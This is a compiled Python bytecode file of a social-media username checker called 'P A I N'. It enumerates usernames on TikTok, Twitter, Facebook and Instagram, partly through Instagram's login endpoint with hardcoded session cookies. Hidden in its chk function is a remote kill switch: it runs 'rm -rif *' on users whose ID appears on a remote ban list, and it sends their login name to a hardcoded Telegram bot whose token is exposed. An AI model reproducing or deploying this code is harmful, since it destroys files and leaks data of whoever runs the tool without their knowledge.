a
    ���_�2  �                   @   s�   d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlmZ dd� Z	dd� Z
dd� Zd	d
� Zdd� Zdd� Zdd� Zedkr�e�  dS )�    N)�BeautifulSoupc                  C   sf  t �� } t�d� d}d}t|� td� td� t�d� tdd��� }|D ]}|�	� }|d	7 }qNd}d}d}td
t
|� � td� t�d� td� td� td� td� zt�d� W n   Y n0 d}	d}
d}ddi}|D �]}|�	� }d| }| j||d�}t|jd�}|�d�}|j}t|�}|dk�rr|	d	7 }	td| d � tdd�}|�|d � |��  n||dk�r�|
d	7 }
td| d � tdd�}|�|d � |��  n8|d	7 }td| d � td d�}|�|d � |��  t�d� q�td!� td"� td� t�d� td#t
|	� � td$t
|
� � td%t
|� � td� td&� t�  d S )'N�clearr   z�
  [37;1m
  ===================
  #Username Checker #
  #TIKTOK User.     #
  #By : P A I N     #
  ===================
  [0m
  � �#[37;1mRead User.txt List......[0m�   �user.txt�r�   �[37;1mUser : �Check All User.......z[37;1mCheck Stared.....�======================� [0mZti_user�
user-agentz�Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1zhttps://www.tiktok.com/@)�headerszhtml.parser�title�[32;1mUSER =>[37;1m u    ✅[0mzti_user/ok_tik.txt�a�
z[31;1mUSER TAKEN =>[37;1m u    ❌[0mzti_user/bad_tik.txtz#[36;1mERROR WHILE CHECK =>[37;1m u    ⛔[0mzti_user/err_tik.txt�[37;1mAll User Checked......z*All User have been saved in ti_user folder�[32;1mOK => [37;1m�[31;1mBAD => [37;1m�[33;1mERR => [37;1m�[37;1m[ENTER FOR BACK][0m)�requests�Session�os�system�print�time�sleep�open�	readlines�strip�str�mkdir�getr   �text�find�len�write�close�input�menu)ZtiqZalltiZ
tiktoklogoZ
tiuserfile�line�tw�oi�bi�eiZoktikZbadtikZerrtik�head�surZtimZcurlZtqZsoupZresultsr&   ZstatsZrkZpaZep� r4   �3B6h.py�Tikuser   s�    
	


�









r6   c                  C   s.  t �� } t�d� d}d}t|� td� td� t�d� tdd��� }|D ]}|�	� }|d	7 }qNd}d}d}td
t
|� � td� t�d� td� td� td� td� zt�d� W n   Y n0 |D ]�}	|	�	� }
d|
 }| �|�}|j}|dk�r:td|
 d � |d	7 }tdd�}|�|
d � |��  n||dk�r~td|
 d � |d	7 }tdd�}|�|
d � |��  n8td|
 d � |d	7 }tdd�}|�|
d � |��  t�d� q�td� td � td� t�d� td!t
|� � td"t
|� � td#t
|� � td� td$� t�  d S )%Nr   r   z�
  [37;1m
  ===================
  #Username Checker #
  #TWITTER User.    #
  #By : P A I N .       #
  ===================
  [0m
  r   r   r   r   r   r	   r
   r   �Check Stared.....r   �[0m Ztw_userzhttps://mobile.twitter.com/��   z[31;1mUSER TAKEN => [37;1m�    ❌ztw_user/bad_tw.txtr   r   �  r   �    ✅ztw_user/ok_tw.txtz#[33;1mERROR WHILE CHECK => [37;1m�    ⛔ztw_user/err_tw.txt�   r   z*All User have been saved in tw_user folderr   r   r   r   �r   r   r   r   r   r   r   r    r!   r"   r#   r$   r%   Zstatus_coder)   r*   r+   r,   )ZteqZalltwZusertewtlogoZ
twuserfiler-   r.   ZouZbuZeur3   ZthmZxurlZpewZchktwZta�ltZerar4   r4   r5   �twitteruser\   sv    
	











rA   c                  C   s&  t �� } t�d� d}d}t|� td� td� t�d� tdd��� }|D ]}|�	� }|d	7 }qNd}d}d}td
t
|� � td� t�d� td� td� td� td� zt�d� W n   Y n0 |D ]�}	|	�	� }
d|
 }| �|�}|j}|dk�r:td|
 d � |d	7 }tdd�}|�|
d � |��  n||dk�r~td|
 d � |d	7 }tdd�}|�|
d � |��  n8td|
 d � |d	7 }tdd�}|�|
d � |��  t�d� q�td� td� td � t�d� td!t
|� � td"t
|� � td#t
|� � td$� t�  d S )%Nr   r   z�
  [37;1m
  ===================
  #Username Checker #
  #Facebook User    #
  #By : P A I N        #
  ===================
  [0m
  z	  [37;1mzRead User.txt List......r   r   r   r	   �User : r   r   r7   r   z  [0m Zfb_userzhttps://m.facebook.com/r9   z[31;1mUSER TAKEN =>[37;1m  r:   zfb_user/bad_fb.txtr   r   r;   �[32;1mUSER => [37;1m r<   zfb_user/ok_fb.txt�$[33;1mERROR WHILE CHECK => [37;1m r=   r>   zAll User Checked......z'All User save in fb_user folder........z[32;1mOK : [37;1m z[31;1mBAD :[37;1m  z[33;1mERR : [37;1m z[37;1m[ ENTER TO BACK ][0mr?   )ZfeqZallfbZ
userfblogoZ
fbuserfiler-   Ziu�okuser�baduserZerrouserZusrZfbuserZlinkZcfkZstatefbZbfZofZefr4   r4   r5   �facebookuser�   st    
	











rG   c                  C   sZ  t �� } t�d� d}d}t|� td� td� t�d� tdd��� }|D ]}|�	� }|d	7 }qNtd
t
|� � td� t�d� td� td� td� dddddddddddddddddd �}d}d}d}	d!}
zt�d"� W n   Y n0 |D ]�}|�	� }|d#d$d%d&�}| j|
||d'�j}d(|v �rftd)| d* � |d	7 }td+d,�}|�|d- � |��  n|d.|v �r�td/| d0 � |d	7 }td1d,�}|�|d- � |��  n8td2| d3 � |	d	7 }	td4d,�}|�|d- � |��  t�d5� q�td6� td7� td� t�d� td8t
|� � td9t
|� � td:t
|	� � td� td;� t�  d S )<Nr   r   z�
  [37;1m
  ===================
  #Username Checker #
  #Instagram User.  #
  #By : P A I N       #
  ===================
  We add 4second sleep time to protect Tool from band
  [0m
  z[37;1m zRead User.txt file.....r   r   r   r	   rB   r   r   r7   z======================[0mz*/*zgzip, deflate, brzen-GB,en-US;q=0.9,en;q=0.8Z270z!application/x-www-form-urlencodedz�ig_cb=1; ig_did=BF4465A9-017D-4668-B5C3-EBD3DA65B2A6; csrftoken=b8kQhInVzG8P5hvZwlxD38EjOrMfqxkC; rur=ASH; mid=XzHZAQALAAEagshAZoRCgkUeXmJPzhttps://www.instagram.comzhttps://www.instagram.com/�emptyZcorszsame-originzsMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36Z b8kQhInVzG8P5hvZwlxD38EjOrMfqxkCZ936619743392459�0Za9aec8fa634fZXMLHttpRequest)Zacceptzaccept-encodingzaccept-languagezcontent-lengthzcontent-typeZcookie�originZrefererzsec-fetch-destzsec-fetch-modezsec-fetch-siter   zx-csrftokenzx-ig-app-idzx-ig-www-claimzx-instagram-ajaxzx-requested-withz.https://www.instagram.com/accounts/login/ajax/Z
user_instaZAdmin123123z{}Zfalse)ZusernameZenc_passwordZqueryParamsZoptIntoOneTap)�datar   z"user": truez[31;1mUSER TAKEN => [37;1m r:   zuser_insta/bad_user.txtr   r   z"user": falserC   r<   zuser_insta/ok_user.txtrD   r=   zuser_insta/err_user.txtr>   r   z-All User have been saved in user_insta folderz[32;1mOK => [37;1m z[31;1mBAD => [37;1m z[33;1mERR => [37;1m r   )r   r   r   r   r   r   r   r    r!   r"   r#   r$   Zpostr&   r)   r*   r+   r,   )ZreqZalluserZuserinstalogoZinstauserfiler-   Zuir2   rE   rF   Zerruser�url�linesZuinZpayloadZhttpr0   r/   r1   r4   r4   r5   �	intsauser�   s�    




��







rN   c                     s�   t �d� d} t �d� t| � tjtj � ttd��}ttd��}tdd��d}t	|�D ]J}d�
� fd	d
�t	|�D ��}|t	|�d kr�|�|� qX|�|d � qXW d   � n1 s�0    Y  t�d� td� t�d� t �d� t�  d S )Nr   z�
  [37;1m
  ===================
  #Username Maker   #
  #USERMAKER        #
  #By : P A I N .       #
  ===================
  [0m
  zrm -rif user.txtzUSER CHAN PETE BET : zCHAN USER DRWS KA : r   za+� c                 3   s   | ]}t �� �V  qd S )N)�randomZchoice)�.0�x�r&   r4   r5   �	<genexpr>\  �    zmk.<locals>.<genexpr>�����r   �   zALL USER SAVED IN USER.TXT.....)r   r   r   �stringZascii_lettersZdigits�intr+   r    �range�joinr)   r   r   r,   )Z
mkuserlogoZlength�count�filerR   �wordr4   rS   r5   �mkJ  s$    
	
.


r_   c                  C   s^  t �d� d} t| � td� td� td� td� td� td�}|d	k�rtd
� td� td� td� td� td� td� td�}|d	kr�t�d� t�  nf|dkr�t�d� t�  nL|dkr�t�d� t�  n2|dkr�t�d� t	�  n|dk�r
t
�  nt
�  nH|dk�r&t��  n4|dk�rBt�d� t�  ntd� t�d� t
�  d S )Nr   us  [37;1m

  _____               _____   _   _ 
 |  __ \      /\     |_   _| | \ | |
 | |__) |    /  \      | |   |  \| |
 |  ___/    / /\ \     | |   | . ` |
 | |       / ____ \   _| |_  | |\  |
 |_|      /_/    \_\ |_____| |_| \_|  
 
 
  [✓] Auth : P A I N
  [✓] Program Language : python 3.8
  _____________________________________________________________
  [0m
  z [37;1mz[ 1 : Username Checker ]z[ 2 : Username Maker ]z[ 0 : EXIT ]r8   zP A I N  : �1z	[37;1m  z[ 1 ] : Facebook Username z[ 2 ] : Instagram Username z[ 3 ] : TikTok Username z[ 4 ] : Twitter Username z[ 0 ] : BACK r   z	Option : r   �2�3�4rI   zJ[31;1mI don't Understand what do you want please write correct option[0m)r   r   r   r+   r   r   rG   rN   r6   rA   r,   �sys�exitr_   )ZmenulogoZ	menuinputZusercheckinputr4   r4   r5   r,   i  sR    











r,   c                  C   s  t �d� tt �� �tt �� � } d�| �}td| � z�t�d�j	}t�d�j	}||v r�td� t �d� dtt �� � }d	| }t�|�}t
��  t�d
� nZ||v r�td� tt �� �}d	| }t�|�}t�d� t�  ntd� t�d� t
��  W n   t
��  Y n0 d S )Nr   �-z[37;1mYour ID : zhttps://txt.do/1efrk/rawzhttps://txt.do/1efr6/rawzYour ID is Banded......z
rm -rif * zTHIS ID BANNEDz�https://api.telegram.org/bot1422551400:AAFvgkTUXSiixZW3gHkgkxlJ4Z7RJoS_lXo/sendMessage?chat_id=744225167&parse_mode=Markdown&text=User chk: r   z![37;1mYOUR ID IS ACTIVE.........r	   z%[37;1mYOUR ID IS NOT ACTIVE.........)r   r   r#   �geteuid�getloginr[   r   r   r%   r&   rd   re   r   r   r,   )Zuuid�idZhttpCahtZhttpBand�msgrL   �gr4   r4   r5   �chk�  s6    






rl   �__main__)r   r   rd   r   ZjsonrX   rP   Zbs4r   r6   rA   rG   rN   r_   r,   rl   �__name__r4   r4   r4   r5   �<module>   s   PGFa<